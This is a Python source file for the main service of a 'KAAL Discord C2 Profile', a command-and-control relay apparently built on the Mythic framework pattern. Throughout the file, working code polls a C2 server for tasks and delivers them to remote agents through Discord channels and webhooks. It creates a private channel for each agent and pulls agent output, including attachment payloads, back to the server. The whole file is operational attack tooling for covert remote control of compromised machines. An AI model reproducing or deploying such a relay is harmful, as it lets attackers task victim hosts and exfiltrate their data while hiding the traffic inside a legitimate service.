#!/usr/bin/env python3
"""
KAAL Discord C2 Profile – Main Container Service
Runs independently, translates between Discord and KAAL server.
"""

import asyncio
import aiohttp
import yaml
import logging
import time
import signal
import sys
import os
from pathlib import Path
from typing import Optional, Dict, Any

from discord_client import DiscordClient
from translator import MessageTranslator
from rate_limiter import RateLimiter
from discord_gateway import DiscordGateway
from channel_manager import ChannelManager

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("discord_c2")

class DiscordC2Profile:
    """
    Main C2 profile service – exact Mythic pattern.
    """
    
    def __init__(self, config_path: str = "config.yaml"):
        # Explicitly look in the same directory as main.py first
        script_dir = os.path.dirname(__file__)
        local_config = os.path.join(script_dir, "config.yaml")
        
        if os.path.exists(local_config):
            config_path = local_config
        elif not os.path.exists(config_path):
             # Try absolute path based on this file
             config_path = os.path.join(script_dir, config_path)
             
        print(f"DEBUG: Loading config from {config_path}")
        self.config = self._load_config(config_path)
        
        self.discord = None # Initialized in start()
        self.gateway = None
        self.translator = MessageTranslator()
        self.rate_limiter = RateLimiter(self.config['rate_limiting'])
        self.running = True
        self.server_session: Optional[aiohttp.ClientSession] = None
        
        # Persistent per-agent channel tracking
        self.channel_manager = ChannelManager()
        
        # Track pending commands
        self.pending_commands = {}
        
        # Rate-limit nudges: agent_id -> last_nudge_timestamp
        self._last_nudge: Dict[str, float] = {}
        
    def _load_config(self, path: str) -> dict:
        """Load configuration from YAML file."""
        try:
            with open(path, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.error(f"Failed to load config from {path}: {e}")
            sys.exit(1)
    
    async def _heartbeat_worker(self):
        """Periodically report relay health to the C2 server."""
        while self.running:
            try:
                schema = "https" if self.config['kaal_server']['use_https'] else "http"
                host = self.config['kaal_server']['host']
                port = self.config['kaal_server']['port']
                url = f"{schema}://{host}:{port}/api/v1/relay/heartbeat"
                payload = {"relay_id": self.config['discord']['bot_token'][-10:]} # Use last 10 of token as ID
                
                # Ensure server_session is initialized before use
                if not self.server_session:
                    self.server_session = aiohttp.ClientSession()

                headers = {}
                ikey = self.config['kaal_server'].get('internal_key')
                if ikey:
                    headers['X-Internal-Key'] = ikey

                async with self.server_session.post(url, json=payload, headers=headers) as resp:
                    if resp.status != 200:
                        logger.warning(f"Failed to send health heartbeat to server: {resp.status}")
            except Exception as e:
                logger.error(f"Health heartbeat error: {e}")
            await asyncio.sleep(60) # Every minute

    async def start(self):
        """Main service loop."""
        self.running = True
        # Start heartbeat worker
        asyncio.create_task(self._heartbeat_worker())
        
        logger.info("🚀 KAAL Discord C2 Profile started")
        logger.info(f"Target Channel ID: {self.config['discord']['channel_id']}")
        
        # Async context manager for Discord Client
        async with DiscordClient(self.config['discord']['bot_token']) as self.discord:
            self.server_session = aiohttp.ClientSession()
            
            # Register with KAAL server
            await self._register_with_server()
            
            # Start Discord Gateway if enabled
            if self.config['discord'].get('use_gateway', False):
                self.gateway = DiscordGateway(self.config['discord']['bot_token'], self._on_discord_message)
                asyncio.create_task(self.gateway.connect())
                logger.info("Discord Gateway started")
            else:
                logger.warning("Gateway disabled in config. Inbound messages will not be processed.")
            
            # Start periodic channel validation (Fix #4)
            asyncio.create_task(self._validate_channels_periodically())
            
            # Main polling loop for outbound commands from server
            logger.info("Entering main outbound polling loop...")
            while self.running:
                try:
                    await self._poll_server_tasks()
                    await self._poll_server_control()
                    await self._check_pending_commands()
                    await asyncio.sleep(self.config['discord']['poll_interval'])
                except Exception as e:
                    logger.error(f"Main loop error: {e}")
                    await asyncio.sleep(5)
            
            # Cleanup
            if self.server_session:
                await self.server_session.close()
    
    async def _poll_server_tasks(self):
        """Poll KAAL server for ANY pending tasks to push to agents."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/v1/c2/tasks"
            
            headers = {}
            ikey = self.config['kaal_server'].get('internal_key')
            if ikey:
                headers['X-Internal-Key'] = ikey

            async with self.server_session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    tasks = data.get("tasks", [])
                    for task in tasks:
                        agent_id = task.get("agent_id")
                        if agent_id:
                            logger.info(f"Got pending task for {agent_id} from server poll")
                            await self._queue_command(agent_id, task)
                elif resp.status != 404: # Ignore 404 if endpoint not ready yet
                     pass
        except Exception as e:
            # logger.debug(f"Server task poll error: {e}")
            pass

    async def _poll_server_control(self):
        """Poll KAAL server for global state broadcasts and push to Discord."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/v1/control"
            
            headers = {}
            ikey = self.config['kaal_server'].get('internal_key')
            if ikey:
                headers['X-Internal-Key'] = ikey

            async with self.server_session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    msgs = data.get("messages", [])
                    for msg in msgs:
                        logger.info(f"Broadcasting control message to Discord: {msg}")
                        # We use "BROADCAST" as the generic target ID
                        await self._queue_command("BROADCAST", msg)
        except Exception as e:
            pass

    async def _register_with_server(self):
        """Register this C2 profile with the KAAL server."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/health"
            
            headers = {}
            ikey = self.config['kaal_server'].get('internal_key')
            if ikey:
                headers['X-Internal-Key'] = ikey

            async with self.server_session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    logger.info("Successfully connected to KAAL server")
                else:
                    logger.warning(f"KAAL server connection issue: {resp.status}")
        except Exception as e:
            logger.error(f"Registration/Connection error with KAAL server: {e}")
    
    async def _create_agent_channel_and_webhook(self, agent_id: str) -> tuple:
        """Create a per-agent Discord channel + webhook. Returns (channel_id, webhook_url) or (None, None)."""
        guild_id = self.config['discord'].get('guild_id')
        if not guild_id:
            return None, None
        ch_name = f"agent-{agent_id[:8]}"
        logger.info(f"🆕 CREATING CHANNEL — Setting up private channel '{ch_name}' for agent '{agent_id}'")
        new_ch = await self.discord.create_text_channel(guild_id, ch_name)
        if not new_ch:
            logger.error(f"❌ CHANNEL CREATION FAILED — Could not create channel for '{agent_id}' in guild {guild_id}")
            return None, None
        ch_id = new_ch['id']
        self.channel_manager.set_channel(agent_id, ch_id)
        
        webhook_url = None
        webhook_data = await self.discord.create_webhook(ch_id, f"hook-{agent_id[:8]}")
        if webhook_data:
            wid = webhook_data.get('id')
            wtok = webhook_data.get('token')
            if wid and wtok:
                webhook_url = f"https://discord.com/api/webhooks/{wid}/{wtok}"
                self.channel_manager.set_channel(agent_id + "_webhook", webhook_url)
                logger.info(f"✅ CHANNEL READY — Agent '{agent_id}' assigned to channel {ch_id} with webhook")
        return ch_id, webhook_url

    async def _on_discord_message(self, msg: dict):
        """Handle incoming MESSAGE_CREATE events from Discord Gateway."""
        channel_id = msg.get('channel_id')
        content = msg.get('content', '')
        author_id = msg.get('author', {}).get('id')
        
        # Ignore our own messages
        if author_id and self.discord and hasattr(self.discord, 'bot_user_id') and author_id == self.discord.bot_user_id:
            return

        # Check if it's our shared channel or a mapped per-agent channel
        shared_channel = self.config['discord']['channel_id']
        is_shared = (channel_id == shared_channel)
        agent_id = self.channel_manager.get_agent_by_channel(channel_id)
        
        if not is_shared and not agent_id:
            return # Message in an unknown channel, ignore

        # --- Verified Adoption Phase 2: Success Check ---
        if not is_shared and agent_id:
            if not self.channel_manager.is_verified(agent_id):
                self.channel_manager.mark_verified(agent_id)

        # Check attachment fallback (large payloads)
        if msg.get('attachments'):
            try:
                att = msg['attachments'][0]
                url = att.get('url')
                if url:
                    logger.info(f"Downloading large WSS payload from attachment: {att.get('filename')}")
                    async with self.server_session.get(url) as resp:
                        if resp.status == 200:
                            file_content = await resp.text()
                            if file_content.startswith('KAAL_AGT:') or len(file_content) > 0:
                                content = file_content
            except Exception as e:
                logger.error(f"Failed to download gateway attachment: {e}")

        # Filter: process only KAAL_AGT messages
        if not content.startswith('KAAL_AGT:'):
            return
            
        try:
            msg_agent_id, server_msg = self.translator.discord_to_server(content)
            target_agent_id = agent_id or msg_agent_id
            
            if 'agent_id' not in server_msg:
                server_msg['agent_id'] = target_agent_id

            # --- Fix #2: Validate channels when message arrives on SHARED channel ---
            if is_shared:
                stored_channel = self.channel_manager.get_channel(target_agent_id)
                if stored_channel:
                    # Agent is talking on shared but has a stored channel — verify it exists
                    ch = await self.discord.get_channel(stored_channel)
                    if not ch:
                        logger.warning(f"⚠️  STALE CHANNEL DETECTED — Agent '{target_agent_id}' had channel {stored_channel} but it was deleted from Discord. Removing stale mapping.")
                        self.channel_manager.remove_agent(target_agent_id)
                        self.channel_manager.remove_agent(target_agent_id + "_webhook")
                        stored_channel = None
                
                if not stored_channel:
                    if server_msg.get('type') == 'register':
                        # FALLBACK: If server hasn't assigned a channel (or we are ahead of it)
                        # ensure we have one for isolation.
                        ch_id, webhook_url = await self._create_agent_channel_and_webhook(target_agent_id)
                        if ch_id:
                            server_msg['transport_id'] = ch_id # Tell server about our channel
                            logger.info(f"🆕 FALLBACK CHANNEL — Created {ch_id} for '{target_agent_id}' during registration")
                    else:
                        # Agent is active but stray — recover it
                        ch_id, webhook_url = await self._create_agent_channel_and_webhook(target_agent_id)
                        if ch_id:
                            reg_cmd = {
                                'type': 'registered',
                                'transport_id': ch_id,
                                'webhook_url': webhook_url or '',
                            }
                            await self._queue_command(target_agent_id, reg_cmd)
                            logger.info(f"🔄 RECOVERY — Created new channel for '{target_agent_id}' and sent adoption nudge")
                else:
                    # Stored channel exists and is valid
                    if server_msg.get('type') == 'register':
                        server_msg['transport_id'] = stored_channel
                    
                    # PERSISTENT NUDGING: Agent is STILL on shared channel despite having
                    # a valid per-agent channel. Re-send the adoption ACK so it can switch.
                    # Rate-limited to once per 30 seconds to avoid spam.
                    now = time.time()
                    last = self._last_nudge.get(target_agent_id, 0)
                    if now - last >= 30:
                        self._last_nudge[target_agent_id] = now
                        webhook_url = self.channel_manager.get_channel(target_agent_id + "_webhook")
                        reg_cmd = {
                            'type': 'registered',
                            'transport_id': stored_channel,
                            'webhook_url': webhook_url or '',
                        }
                        await self._queue_command(target_agent_id, reg_cmd)
                        logger.info(f"📢 NUDGE — Agent '{target_agent_id}' is still on #general but has channel {stored_channel}. Re-sending adoption command.")
                    
            logger.info(f"Received Gateway C2 message from {target_agent_id} (Size: {len(content)} bytes, Channel: {channel_id})")
            await self._forward_to_server(target_agent_id, server_msg)
        except Exception as e:
            logger.error(f"Error processing Discord Gateway message: {e}")
    
    async def _forward_to_server(self, agent_id: str, message: dict):
        """Forward translated message to KAAL server."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            path = self.config['kaal_server']['api_path']
            url = f"{schema}://{host}:{port}{path}"
            
            headers = {}
            ikey = self.config['kaal_server'].get('internal_key')
            if ikey:
                headers['X-Internal-Key'] = ikey

            async with self.server_session.post(url, json=message, headers=headers) as resp:
                if resp.status == 200:
                    response = await resp.json()
                    await self._handle_server_response(agent_id, response)
                else:
                    logger.error(f"Server forward failed: {await resp.text()}")
        except Exception as e:
            logger.error(f"Forward error: {e}")
            
    async def _handle_server_response(self, agent_id: str, response: Any):
        """Handle response from server (commands to agent)."""
        if isinstance(response, dict):
            if 'command' in response:
                 await self._queue_command(agent_id, response)
            elif 'tasks' in response and isinstance(response['tasks'], list):
                for task in response['tasks']:
                    await self._queue_command(agent_id, task)

    async def _queue_command(self, agent_id: str, command: dict):
        """Queue a command for delivery to agent via its channel."""
        
        # --- Fix #1: Flatten "registered" messages for the agent ---
        # The server nests transport_id inside "payload", but agents expect it at top level.
        if command.get('type') == 'registered':
            payload = command.get('payload', {})
            if isinstance(payload, dict):
                transport_id = payload.get('transport_id') or command.get('transport_id')
                # Catch empty string vs None
                if not transport_id and 'transport_id' in payload:
                    transport_id = payload['transport_id']
            else:
                transport_id = command.get('transport_id')
            
            # FALLBACK: If payload was encrypted or empty, use channel_manager
            if not transport_id:
                transport_id = self.channel_manager.get_channel(agent_id)
            
            # Get webhook URL from channel manager
            webhook_url = self.channel_manager.get_channel(agent_id + "_webhook")
            if not webhook_url:
                webhook_url = command.get('webhook_url', '')
            
            # Build a clean flattened structure
            flattened = {
                'type': 'registered',
                'agent_id': agent_id,  # Add this for ID adoption
                'transport_id': transport_id or '',
                'webhook_url': webhook_url or '',
            }
            for key in ['version', 'task_id', 'seq']:
                if key in command:
                    flattened[key] = command[key]
            
            # --- CRITICAL: Update local mapping to match server's decision ---
            if transport_id:
                self.channel_manager.set_channel(agent_id, transport_id)
                if webhook_url:
                    self.channel_manager.set_channel(agent_id + "_webhook", webhook_url)
                logger.info(f"🔄 SYNC — Local mapping updated to match server: {agent_id} -> {transport_id}")

            command = flattened
            logger.info(f"📨 ADOPTION ACK — Sending flattened 'registered' to '{agent_id}': channel={transport_id}, webhook={'✓' if webhook_url else '✗'}")

        discord_msg = self.translator.server_to_discord(agent_id, command)
        
        # Route to per-agent channel if available, else shared
        # CRITICAL: commands go to shared channel until agent is VERIFIED
        shared_channel = self.config['discord']['channel_id']
        target_channel = shared_channel
        
        if command.get('type') == 'registered':
            # Always send registration ACKs to general
            target_channel = shared_channel
        elif self.channel_manager.is_verified(agent_id):
            # Only use private channel AFTER agent has checked in from it
            target_channel = self.channel_manager.get_channel(agent_id) or shared_channel
        else:
            # Not verified yet, stay on general
            target_channel = shared_channel
            if self.channel_manager.get_channel(agent_id):
                logger.info(f"⏳ PENDING VERIFICATION — Agent '{agent_id}' has channel but hasn't checked in yet. Using #general.")
            
        route_label = "#general (shared)" if target_channel == shared_channel else f"per-agent channel {target_channel}"
        logger.info(f"📤 OUTBOUND — Sending command to '{agent_id}' via {route_label}")
        result = await self.discord.send_message(target_channel, discord_msg)
        
        if result:
            logger.info(f"✅ DELIVERED — MsgID: {result.get('id')} to '{agent_id}'")
            task_id = command.get('task_id', 'unknown')
            self.pending_commands[task_id] = {
                'agent_id': agent_id,
                'sent_at': time.time(),
                'command': command,
                'discord_id': result.get('id')
            }
        else:
            # Fix #3: Auto-recovery when per-agent channel is dead
            if target_channel != shared_channel:
                logger.warning(f"⚠️  SEND FAILED — Per-agent channel {target_channel} for '{agent_id}' returned error (likely deleted). Purging mapping...")
                self.channel_manager.remove_agent(agent_id)
                self.channel_manager.remove_agent(agent_id + "_webhook")
                logger.info(f"🔄 FALLBACK — Retrying command for '{agent_id}' on #general (shared channel)...")
                retry_result = await self.discord.send_message(shared_channel, discord_msg)
                if retry_result:
                    logger.info(f"✅ FALLBACK SUCCESS — Command delivered to '{agent_id}' via #general. MsgID: {retry_result.get('id')}")
                else:
                    logger.error(f"❌ FALLBACK FAILED — Could not deliver command to '{agent_id}' even on #general!")
            else:
                logger.error(f"❌ SEND FAILED — Could not deliver command to '{agent_id}' on #general (shared channel)")
    
    async def _check_pending_commands(self):
        """Check for command timeouts."""
        now = time.time()
        for task_id, cmd_info in list(self.pending_commands.items()):
            if now - cmd_info['sent_at'] > 60:
                del self.pending_commands[task_id]

    async def _validate_channels_periodically(self):
        """Fix #4: Periodically verify all stored channels still exist on Discord."""
        while self.running:
            await asyncio.sleep(3600)  # Once per hour
            try:
                for agent_id, ch_id in list(self.channel_manager.mapping.items()):
                    if agent_id.endswith("_webhook"):
                        continue
                    ch = await self.discord.get_channel(ch_id)
                    if not ch:
                        logger.info(f"🧹 PERIODIC CLEANUP — Channel {ch_id} for '{agent_id}' no longer exists on Discord. Removing stale mapping.")
                        self.channel_manager.remove_agent(agent_id)
                        self.channel_manager.remove_agent(agent_id + "_webhook")
                    await asyncio.sleep(1)  # Rate limit courtesy
            except Exception as e:
                logger.error(f"Periodic channel validation error: {e}")
                
    async def shutdown(self):
        """Graceful shutdown."""
        logger.info("Shutting down Discord C2 profile")
        self.running = False
        if self.gateway:
            await self.gateway.close()

async def main():
    profile = DiscordC2Profile()
    
    loop = asyncio.get_running_loop()
    try:
        if sys.platform != 'win32':
            for sig in (signal.SIGTERM, signal.SIGINT):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(profile.shutdown()))
    except NotImplementedError:
        pass
    
    try:
        await profile.start()
    except KeyboardInterrupt:
        await profile.shutdown()

if __name__ == "__main__":
    try:
        # Windows selector event loop policy fix (if needed for older python/aiohttp)
        # if sys.platform == 'win32':
        #      asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"CRITICAL ERROR: {e}")
        sys.exit(1)
